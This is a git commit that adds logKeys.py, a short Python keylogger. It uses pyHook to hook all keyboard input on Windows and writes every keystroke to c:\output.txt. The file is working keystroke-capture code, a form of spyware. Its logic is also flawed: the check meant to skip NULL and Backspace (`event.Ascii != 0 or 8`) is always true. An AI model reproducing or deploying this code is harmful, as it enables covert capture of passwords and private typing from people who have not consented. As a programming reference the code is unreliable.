aeed269f1774b82d2041ea1e5482bbbfe7e7e5f2
WorksWellWithOthers <kenneth.e.oliphant@gmail.com>
2016-04-17 22:53:54 -0700

    made a seperate log key file in case of need

---
+++ logKeys.py
@@ -0,0 +1,24 @@
+#! /usr/bin/env python
+import pythoncom
+import pyHook
+
+def callLogKeys(event):
+    # 0 is for NULL 8 is for Backspace
+    if event.Ascii != 0 or 8:
+        file=open('c:\output.txt','r+')
+        buffer = file.read()
+        file.close()
+    file = open('c:\output.txt','w')
+    recordKeys = chr(event.Ascii)
+    # 13 is for Enter
+    if event.Ascii == 13:
+        recordKeys = '\n'
+    buffer = buffer + recordKeys
+    file.write(buffer)
+    file.close()
+hookManager = pyHook.HookManager()
+# This calls the function callLogKeys()
+hookManager.KeyDown = callLogKeys
+hookManager.HookKeyboard()
+# Waits 
+pythoncom.PumpMessages()
